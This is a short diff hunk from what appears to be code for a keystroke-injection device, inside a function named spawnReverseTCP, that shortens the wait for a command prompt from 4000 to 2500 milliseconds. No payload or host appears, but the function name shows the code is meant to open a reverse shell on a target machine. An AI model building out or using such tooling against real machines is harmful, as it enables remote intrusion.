@@ -163,7 +163,7 @@ void spawnReverseTCP()
     clearKeys();
     
     // Give CMD some time to appear.
-    delay(4000);
+    delay(2500);
     
     // CMD is ready.
     returnCode(1, 100);
